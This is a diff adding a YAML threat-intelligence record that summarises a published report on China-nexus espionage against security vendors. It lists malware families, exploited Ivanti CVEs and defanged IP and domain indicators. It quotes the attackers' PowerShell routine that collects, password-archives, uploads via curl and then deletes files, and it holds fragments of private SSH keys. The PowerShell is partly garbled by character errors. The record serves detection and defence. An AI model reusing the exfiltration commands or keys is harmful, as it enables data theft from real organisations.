@@ -1,0 +1,73 @@
+description: This report details persistent cyberespionage activity targeting cybersecurity
+  vendors and other organizations, attributed to China-nexus actors. The activities
+  include reconnaissance of SentinelOne infrastructure, the resurgence of dsniff tooling,
+  and exploitation of Ivanti vulnerabilities.
+attribution: China-nexus cyberespionage actors
+malware_families:
+- GOREshell
+- dsniff
+authors:
+- Aleksandar Milenkoski
+- Tom Hegel
+TTPs:
+  processes:
+  - curl.exe
+  - 7z.exe
+  - update-notifier
+  commandline:
+  - curl.exe -X POST -F file=SwPath\\$mac-$wDate.dat -k Supurl
+  - C:\\Progra~1\\7-Zip\\7z.exe a -mhe=on $uPath\\$mac-$wDate.dat -p"pass SwPath\\*.zip"
+  - /usr/bin/update-notifier
+  powershell:
+  - '$uPath="C:\\windous\\vss'';SuDate=(Get-Date -Format ''yyyyMidd'');$mac=((Get-NetAdapter
+    | Where-Object { $_.Status -eq ''Up } | Select-Object -First 1 -ExpandPropertyMacAddress)
+    -replace ''[-|:]'').Tolower();New-Tten -TtemType Directory -Path SwPath\\temp;Get-ChildItem
+    Sdirs -Recurse | Where-Object -FilterScript { $_.LastiriteTime -ge (Get-Date).AddDays(-Sdays)
+    -and $_.Name -match Stypes } | % { Copy-Ttem -Path $_.FullName -Destination SwPath\\temp\\
+    };Compress-Archive -Path SwPath\\temp -Update -DestinationPath SwPath\\$mac-SuDate.zip;C:\\Progra~1\\7-Zip\\7z.exe
+    a -mhe=on $uPath\\$mac-$wDate.dat -p"pass SwPath\\*.zip;cnd / "curl.exe -X POST
+    -F file=SwPath\\$mac-$wDate.dat -k Supurl;Remove-Ttem -Path SuPath\\temp,SwPath\\*.zip,$wPath\\*.dat
+    -Recurse;''
+
+    '
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: curl.exe
+    destination: downloads.trendav[.]vip
+    port: '443'
+  - executable: wss://107.173.111[.]26:443
+  - executable: tls://107.173.111[.]26:80
+  file_activity:
+  - C:\\windous\\vss
+  - SwPath\\temp
+  - $uPath\\$mac-$wDate.dat
+  - SwPath\\*.zip
+  - C:\\Progra~1\\7-Zip\\7z.exe
+  persistence:
+  - Timestomping of executables to September 15, 2021.
+  pipes: []
+  process_relations: []
+IOCs:
+- ip: 128.199.124[.]136
+- domain: tatacom.duckdns[.]org
+- ip: 142.93.214[.]219
+- domain: downloads.trendav[.]vip
+- ip: 143.244.137[.]54
+- domain: cloud.trendav[.]coin
+- domain: trendav[.]vip
+- domain: secmailbox[.]us
+- domain: sentinelxdr[.]us
+- ip: 142.93.212[.]42
+- ssh_key_fingerprint: f0746e78e49896dfa01c674bf2a800443b1966c54663db5c679bc86533352590
+- ssh_key: MC4CAQAwBQYDK2VwBCIEIMsHXDEWgXiPFrIjDOSXZqReC2HHiS6kgoZT0YgHlK87-----END
+    PRIVATE KEY-----
+- ssh_key: MC4CAQAwBQYDK2VwBCIEINArpOAwJO2+lv9Da+PzmkbKxGhMcapQ+/NhUq4nifvh -----END
+    PRIVATE KEY-----
+- ip: 107.173.111[.]26
+- cve: CVE-2024-8963
+- cve: CVE-2024-8190
+reference: https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets/
+date_of_publication: June 09, 2025
+file_creation_date: June 11, 2025
